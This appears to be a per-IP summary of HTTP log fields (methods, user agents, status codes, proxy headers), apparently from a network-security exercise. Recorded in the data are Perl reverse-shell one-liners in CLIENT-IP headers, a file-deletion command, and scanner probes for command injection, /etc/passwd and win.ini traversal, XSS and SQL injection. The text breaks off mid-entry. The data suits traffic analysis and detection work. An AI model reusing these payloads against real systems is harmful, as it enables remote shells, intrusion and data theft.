#  'YVFUKU' 'some' 'HEAD' 'PROPFIND' 'BXNTPG' 'SEARCH' 'XORXZY' 'user'
#  'NVKHMY' 'PCKOIZ' 'TRACE' 'TRACK' 'NESSUS' 'EAILCX' 'KTGFFX' 'PUT'
#  'FHGDMH' 'WOIGAG' 'EQAONR' 'GATMQW' 'JZUIPY' 'UIZUPR' 'FPANCV' 'JULUOO'
#  'CEXLCB' 'RWXDSY' 'RRRHRH' 'CFFWFE' 'LIAYPN' 'SHZGJU' 'OMSHFQ' 'STBAGO'
#  'ZUHEZF' 'QEQPAY' 'RXKLNG' 'UGLOBT' 'XQVMVV' 'IJQKXT' 'FSMTJV' 'FTRXOE'
#  'DKAYVI' 'SUMTHR' 'UTFFHY' 'YGPFYB' 'OOEWLB' 'KZBPDI' 'YUFQDS' 'FYEMFA'
#  'WPBVGL' 'SHFUAV' 'PRCZJG' 'PAVQPZ']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  nan 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'
#  'Nessus SOAP v0.0.1 (Nessus.org)' 'NetSupport Manager/1.0' 'webmin'
#  'Nessus' 'NESSUS::SOAP' '"; system(id);#'
#  "mercuryboard_user_agent_sql_injection.nasl'"
#  'Mozilla/4.0 (compatible; gallery_203.nasl; Googlebot)'
#  'Fastream NETFile Server' 'MSFrontPage/4.0' 'MSFrontPage/5.0'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
#  'Wget/1.12 (linux-gnu)']
# Status Code:  [200. 503. 400. 302. 403.  nan 404. 501. 405. 500. 303. 301. 401. 505.
#  417. 206. 502. 411. 304.]
# Status Message:  ['OK' 'Service Unavailable' 'Bad Request' 'Found' 'Forbidden' '<empty>'
#  nan 'Not Found' 'Method Not Implemented' 'Method Not Allowed'
#  'Not Implemented' 'Internal Server Error' 'See Other' 'Moved Permanently'
#  'Authorization Required' 'HTTP Version Not Supported' 'Unauthorized'
#  'Moved Temporarily' 'Expectation Failed' 'Partial Content' 'NOT FOUND'
#  'METHOD NOT ALLOWED' 'Not Allowed' 'UNAUTHORIZED' 'Access denied'
#  'Bad Gateway' 'Length Required' 'Not Modified']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'VIA -> SIP/2.0/TCP nm;branch=foo' 'PROXY-CONNECTION -> Close']
#
#
#
# IP:  192.168.202.87
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.106 Chrome/15.0.874.106 Safari/535.2']
# Status Code:  [200. 302. 304. 404.]
# Status Message:  ['OK' 'Found' 'Not Modified' 'Not Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.83
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.79 Safari/535.11']
# Status Code:  [200. 302.]
# Status Message:  ['OK' 'Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
# IP:  192.168.203.45
#
# Method:  ['GET' nan 'OPTIONS' 'HEAD' 'CONNECT' 'POST' 'PUT']
# User Agent:  [nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)'
#  'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:5.0.1) Gecko/20100101 Firefox/5.0.1'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)']
# Status Code:  [200. 503. 400. 302. 403.  nan 404. 303. 500. 304. 301. 405. 401. 201.]
# Status Message:  ['OK' 'Service Unavailable' 'Bad Request' 'Found' 'Forbidden' '<empty>'
#  nan 'Not Found' 'NOT FOUND' 'See Other' 'Internal Server Error'
#  'Not Modified' 'Moved Permanently' 'FOUND' 'Method Not Allowed'
#  'Authorization Required' 'Created']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'VIA -> SIP/2.0/TCP nm;branch=foo']
#
#
#
# IP:  192.168.28.100
#
# Method:  ['POST']
# User Agent:  ['Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1']
# Status Code:  [200.  nan]
# Status Message:  ['OK' nan]
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.112
#
# Method:  ['GET' 'POST' nan 'cat']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' nan
#  'Wget/1.12 (linux-gnu)']
# Status Code:  [200. 302. 304.  nan 404. 403. 401. 301. 303. 400. 500.]
# Status Message:  ['OK' 'Found' 'Not Modified' nan 'Not Found' 'Forbidden'
#  'Authorization Required' 'Moved Permanently' 'See Other' 'NOT FOUND'
#  'Bad Request' 'Unauthorized' 'Moved Temporarily' 'Internal Server Error']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.24.100
#
# Method:  ['POST']
# User Agent:  ['Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.26.100
#
# Method:  ['POST']
# User Agent:  ['Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.27.100
#
# Method:  ['POST' 'GET']
# User Agent:  ['Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1'
#  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)']
# Status Code:  [200. 404.]
# Status Message:  ['OK' 'Not Found ']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.204.45
#
# Method:  ['GET' 'OPTIONS' nan 'HEAD' 'CONNECT' 'POST' '192.168.24.100']
# User Agent:  [nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)'
#  'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)']
# Status Code:  [503. 200. 404. 400. 403. 302.  nan 303. 304. 401.]
# Status Message:  ['Service Unavailable' 'OK' 'NOT FOUND' 'Bad Request' 'Forbidden'
#  '<empty>' 'Found' nan 'See Other' 'Not Found' 'Not Modified'
#  'Authorization Required' 'Unauthorized']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'VIA -> SIP/2.0/TCP nm;branch=foo']
#
#
#
# IP:  192.168.202.103
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0']
# Status Code:  [200. 404. 302. 401. 405. 304. 303. 500.]
# Status Message:  ['OK' 'Not Found' 'Found' 'Unauthorized' 'NOT FOUND' 'UNAUTHORIZED'
#  'METHOD NOT ALLOWED' 'Not Modified' 'NOT MODIFIED' 'See Other'
#  'Internal Server Error']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.203.64
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1'
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)'
#  'Wget/1.12 (linux-gnu)']
# Status Code:  [200. 304. 404. 302. 401. 301. 405.]
# Status Message:  ['OK' 'Not Modified' 'Not Found' 'NOT FOUND' 'NOT MODIFIED' 'Found'
#  'Authorization Required' 'Moved Permanently' 'UNAUTHORIZED'
#  'METHOD NOT ALLOWED']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.94
#
# Method:  ['GET' nan 'OPTIONS' 'POST']
# User Agent:  [nan
#  'Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1']
# Status Code:  [200. 503. 404. 400. 302. 403.  nan 303. 304. 301.]
# Status Message:  ['OK' 'Service Unavailable' 'Not Found' 'Bad Request' 'Found' 'Forbidden'
#  '<empty>' nan 'NOT FOUND' 'See Other' 'Not Modified' 'Moved Permanently']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'VIA -> SIP/2.0/TCP nm;branch=foo']
#
#
#
# IP:  192.168.202.115
#
# Method:  ['OPTIONS' 'PROPFIND' 'GET']
# User Agent:  ['Microsoft-WebDAV-MiniRedir/5.1.2600'
#  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.79 Safari/535.11']
# Status Code:  [302. 200. 405. 404. 304.  nan]
# Status Message:  ['Found' 'OK' 'Method Not Allowed' 'Not Found' 'Not Modified' nan]
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.95
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1']
# Status Code:  [200. 302. 303. 304. 404.]
# Status Message:  ['OK' 'Found' 'See Other' 'Not Modified' 'Not Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.101
#
# Method:  ['GET' 'POST' nan]
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  nan]
# Status Code:  [200. 403. 400. 302.  nan 503.]
# Status Message:  ['OK' 'Forbidden' '<empty>' 'Found' nan 'Bad Request'
#  'Service Unavailable']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.100
#
# Method:  ['GET' nan 'OPTIONS' 'HEAD' 'CONNECT' 'POST' 'PUT']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)']
# Status Code:  [200. 404. 401.  nan 403. 400. 302. 303. 500. 405. 201.]
# Status Message:  ['OK' 'Not Found' 'Unauthorized' nan 'Forbidden' '<empty>' 'Found'
#  'See Other' 'Bad Request' 'Authorization Required'
#  'Internal Server Error' 'NOT FOUND' 'UNAUTHORIZED' 'METHOD NOT ALLOWED'
#  'Created']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'PROXY-CONNECTION -> keep-alive']
#
#
#
# IP:  192.168.202.107
#
# Method:  ['GET']
# User Agent:  [nan]
# Status Code:  [301.]
# Status Message:  ['Moved Permanently']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.80
#
# Method:  ['GET' nan 'OPTIONS' 'POST']
# User Agent:  [nan
#  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0.1) Gecko/20100101 Firefox/9.0.1']
# Status Code:  [200. 503. 404. 400. 403. 302.  nan 303. 304.]
# Status Message:  ['OK' 'Service Unavailable' 'Not Found' 'Bad Request' 'Forbidden'
#  '<empty>' 'Found' nan 'See Other' 'Not Modified']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'VIA -> SIP/2.0/TCP nm;branch=foo']
#
#
#
# IP:  192.168.202.108
#
# Method:  ['GET' nan 'OPTIONS' 'HEAD' 'CONNECT' 'POST' 'PUT']
# User Agent:  [nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
#  'Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2']
# Status Code:  [403. 400. 302. 200. 503.  nan 404. 401. 303. 304. 201. 500.]
# Status Message:  ['Forbidden' '<empty>' 'Found' 'OK' 'Bad Request' 'Service Unavailable'
#  nan 'Not Found' 'NOT FOUND' 'Authorization Required' 'See Other'
#  'Not Modified' 'Created' 'Internal Server Error']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'VIA -> SIP/2.0/TCP nm;branch=foo']
#
#
#
# IP:  192.168.202.118
#
# Method:  ['POST' 'GET' nan 'SEARCH' 'OPTIONS' 'DESCRIBE' 'PUT']
# User Agent:  [nan
#  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
#  'TnOfjohbqPcewt2QtUE6d9rl1y3DrkQ0SvIj4H'
#  'zxENHbZltTBZd085nxR7w7d32yqimUlf7RL2t5rgxaCjSitCXJKu6k3WN1WZpc2WvoOfA9cfHZQpq'
#  'kHsUGdKI4QGC1VCTqX7Pr7WrZXKEHxdDmJrq2OFWz1rTEgxNXxHSwN' 'Wget/1.11.4'
#  'HHdJbkexI3538R8FmRYLxYUBV7wg5VXMa7mf40kU0kiv2WLWhiGzKOZLnWNjTyUQmodQzZV9djqQIdJek'
#  'nUbKpJkgeXZXNYz86PFuvKq0l1Hv4VwClYDUlwuEOZiIfxUHJi'
#  'uYw6aXPltl0lpjG8ac4snO4RqmVjdS84XnLGU6dMReOMaswJ6vRb5OKroWC']
# Status Code:  [404. 200.  nan 403. 414. 400. 501. 405. 500. 302. 401.]
# Status Message:  ['Not Found' 'OK' nan 'Forbidden' 'Request-URI Too Large' 'Bad Request'
#  'Method Not Implemented' 'Method Not Allowed' 'Internal Server Error'
#  'Found' 'Authorization Required']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.118:18998");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> rm -f tiki-config.php'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.118:36192");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.118:17693");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.118:32025");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.118:7754");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.118:6543");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';']
# IP:  192.168.203.63
#
# Method:  ['GET' 'POST' 'HEAD']
# User Agent:  ['Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/9.04 (jaunty) Firefox/3.6.11'
#  'DirBuster-0.12 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)'
#  'w3af.sourceforge.net']
# Status Code:  [200. 404. 302.  nan 304. 401. 405. 400.]
# Status Message:  ['OK' 'Not Found' 'Found' 'NOT FOUND' nan 'NOT MODIFIED' 'UNAUTHORIZED'
#  'METHOD NOT ALLOWED' 'Bad Request']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  ['PROXY-CONNECTION -> keep-alive' nan]
#
#
#
# IP:  192.168.202.122
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0'
#  'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)']
# Status Code:  [200. 404. 302. 304. 401.  nan]
# Status Message:  ['OK' 'NOT FOUND' 'FOUND' 'NOT MODIFIED' 'Not Found' 'UNAUTHORIZED' nan
#  'Found']
# Info Code:  [ nan 100.]
# Info Message:  [nan 'Continue']
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.65
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0']
# Status Code:  [200. 404. 302. 304. 500.  nan]
# Status Message:  ['OK' 'NOT FOUND' 'FOUND' 'Not Found' 'NOT MODIFIED'
#  'Internal Server Error' 'Not Modified' nan 'Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.25.100
#
# Method:  ['POST']
# User Agent:  ['Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.97
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  2001:dbb:c18:204:20c:29ff:fe4e:9e86
#
# Method:  ['GET']
# User Agent:  [nan]
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.26.254
#
# Method:  ['POST' 'GET']
# User Agent:  ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.79 Safari/535.11']
# Status Code:  [200. 304. 302.]
# Status Message:  ['OK' 'Not Modified' 'Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.125
#
# Method:  ['GET' 'POST' 'OPTIONS' 'CONNECT' nan 'TRACE' 'DEBUG' 'TRACK']
# User Agent:  ['Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)'
#  '<script>alert(12345)</script>' nan
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)'
#  "123456' generate sql error" 'SomeCustomInjectedHeader:injected_by_wvs'
#  'http://some-inexistent-website.acu/some_inexistent_file_with_long_name'
#  '1some_inexistent_file_with_long_name'
#  'http://testphp.vulnweb.com/acunetix_file_inclusion_test?' ')'
#  '!(()&&!|*|*|' '^(#$!@#$)(()))******' '&cat /etc/passwd'
#  '&cat /etc/passwd&' 'cat /etc/passwd' '`cat /etc/passwd`'
#  '|cat /etc/passwd#' '268435455' ';cat /etc/passwd;' '||cat /etc/passwd'
#  '1e309' 'M3YxbElVcDkwTkxPNVNxaQ==' '\'"\'");|]*{%0d%0a<%00>' '&dir'
#  'print(md5(acunetix_wvs_security_test));die();/*' '|dir'
#  '${@print(md5(acunetix_wvs_security_test))}'
#  '../../../../../../../../../../etc/passwd'
#  '../../../../../../../../../../etc/passwd%00.png'
#  '/../..//../..//../..//../..//../..//etc/passwd%00'
#  'acunetix_wvs_invalid_filename' 'login' 'login/.' "1'" '\\xc0 xa7' '1"'
#  '\\xc0\\xa2' 'JyI=' '\\xbf\'\\xbf"' '\\xf0\'\'\\xf0""'
#  '//www.acunetix.tst' '\'"' '<!--'
#  '\'"()&%1<ScRiPt >prompt(945646)</ScRiPt>' 'OTU4MjA0'
#  '${@print(md5(acunetix_wvs_security_test))}\\'
#  '.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd' '/etc/passwd'
#  '../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd'
#  '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd'
#  '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd'
#  'invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ ...
#  'file:///etc/passwd' '/\\../\\../\\../\\../\\../\\../\\../etc/passwd'
#  '../../../../../../../../../../windows/win.ini' 'c:/windows/win.ini'
#  '../../../../../../../../../../windows/win.ini%00'
#  '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afwin.ini'
#  '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini'
#  '/.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./windows/win.ini'
#  '../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini'
#  '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini'
#  'unexisting/../../../../../../../../../../windows/win.ini.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\